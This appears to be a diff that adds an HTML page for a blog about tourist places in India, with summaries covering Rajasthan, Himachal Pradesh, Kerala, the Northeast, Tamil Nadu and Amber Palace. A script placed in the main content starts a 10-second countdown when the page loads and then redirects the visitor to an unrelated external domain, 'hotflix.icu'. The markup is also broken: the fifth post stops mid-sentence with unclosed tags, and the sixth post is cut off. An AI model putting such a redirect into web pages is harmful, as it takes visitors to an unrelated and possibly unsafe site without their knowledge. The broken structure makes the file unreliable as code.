@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blog - Tourist Places in India</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        #timer {
+            font-size: 5em;
+            text-align: center;
+            margin-top: 5%;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header Section -->
+    <header>
+        <div class="logo">
+            <h1>Explore India</h1>
+        </div>
+        <nav>
+            <ul>
+                
+                <li><a href="blog.html" class="active">Blog</a></li>
+                <li><a href="about.html">About</a></li>
+                <li><a href="contact.html">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- Main Content Section -->
+    <main>
+        <div id="timer">10</div>
+
+    <script>
+        // Set the countdown duration (in seconds)
+        var countdownDuration = 10;
+        
+        // Function to update the countdown
+        function updateCountdown() {
+            var timerElement = document.getElementById('timer');
+            var remainingTime = countdownDuration;
+
+            // Update the timer every second
+            var interval = setInterval(function() {
+                remainingTime--;
+                timerElement.textContent = remainingTime;
+
+                // When the countdown reaches 0, clear the interval and redirect
+                if (remainingTime <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://www.hotflix.icu/home';
+                }
+            }, 1000);
+        }
+
+        // Start the countdown
+        updateCountdown();
+    </script>
+        <div class="content-container">
+            <!-- Blog Posts Section -->
+            <section class="blog-posts">
+                <h2>Recent Blog Posts</h2>
+                
+                <!-- First Blog Post -->
+                <article class="blog-summary">
+                    <h3><a href="#">Discover the Wonders of Rajasthan</a></h3>
+                    <img src="https://wallpaperaccess.com/full/3214847.jpg" alt="Rajasthan" style="width: 100%; height: auto;" />
+                    <p>
+                        Rajasthan is home to stunning palaces, forts, and vibrant culture. Explore the grandeur of Jaipur,
+                        Udaipur, and Jaisalmer, where history comes alive in majestic forts and intricate architecture.
+                        Delve into the desert lifestyle of Jodhpur and Bikaner.
+                    </p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <!-- Second Blog Post -->
+                <article class="blog-summary">
+                    <h3><a href="#">The Hidden Gems of Himachal Pradesh</a></h3>
+                    <img src="https://wallpapercave.com/wp/wp13852574.jpg" alt="Himachal Pradesh"  style="width: 100%; height: auto;"/>
+                    <p>
+                        Himachal Pradesh offers stunning views of the Himalayas, and beyond the famous cities of Shimla and Manali,
+                        there are quieter spots like Chitkul, Kaza, and Dharamkot, where you can immerse yourself in nature.
+                    </p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <!-- Third Blog Post -->
+                <article class="blog-summary">
+                    <h3><a href="#">Explore the Backwaters of Kerala</a></h3>
+                    <img src="https://wallpaperaccess.com/full/1635200.jpg" alt="Kerala Backwaters" style="width: 100%; height: auto;" />
+                    <p>
+                        Drift through the backwaters of Kerala on a traditional houseboat, surrounded by serene canals, vibrant
+                        wildlife, and swaying coconut trees. Alleppey and Kumarakom are two of the best-known spots to experience
+                        this peaceful escape.
+                    </p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <!-- Fourth Blog Post -->
+                <article class="blog-summary">
+                    <h3><a href="#">A Journey to the Northeastern States of India</a></h3>
+                    <img src="https://cdn.wallpapersafari.com/50/36/AhyozV.jpg" alt="Northeastern India" style="width: 100%; height: auto;" />
+                    <p>
+                        The unexplored beauty of India’s Northeastern states offers a blend of cultures, scenic landscapes,
+                        and tranquility. Visit the cleanest village in Asia, Mawlynnong in Meghalaya, or explore the diverse
+                        culture and history of Nagaland and Sikkim.
+                    </p>
+                    <a href="#" class="read-more">Read More</a>
+                </article>
+
+                <!-- Fifth Blog Post -->
+                <article class="blog-summary">
+                    <h3><a href="#">Beaches and Temples of Tamil Nadu</a></h3>
+                    <img src="https://wallpaperaccess.com/full/1446813.jpg" alt="Tamil Nadu" style="width: 100%; height: auto;" />
+                    <p>
+                        Tamil Nadu, famous for its ancient temples, offers spiritual experiences and stunning beach getaways.
+                        The historical temples of Madurai and Mahabalipuram, combined with the serene beauty of Pondicherry,
+                        provide an unforgettable
+                 <!-- Sixth Blog Post -->
+                 <article class="blog-summary">
+                    <h3><a href="#">Amber Palace</a></h3>
+                    <img src="https://dynamic-media-cdn.tripadvisor.com/media/photo-o/17/d3/a8/57/images-30-largejpg.jpg?w=700&h=400&s=1" alt="Amber Palace" style="width: 100%; height: auto;" />
+                    <p>
+                        Amer fort is 15 kms from the Jaipur city. We travelled there by a ola cab. Hired a jeep to reach the entrance for Rs 550 per jeep ride for up and down with 2 hrs waiting. 
+                        The entrance fee is reduced to almost less than half for students with valid Id proof. We hired a guide at the jeep stand also for Rs 400. The place is a worth visit if you are in Jaipur. There are some and 
+                        old and new constructions in the place. Guide was of great help as explained the historical importance of the place. It's beautiful with carvings, paintings of vegetable colour, rooms of queens and kings, sheesh Mahal.
+                         A beautiful monument with exceptional history. Just loved the whole experience!! The only annoying thing is that the drivers of cabs, rickshaw etc all cheat a lot. The tourists have to be really careful.
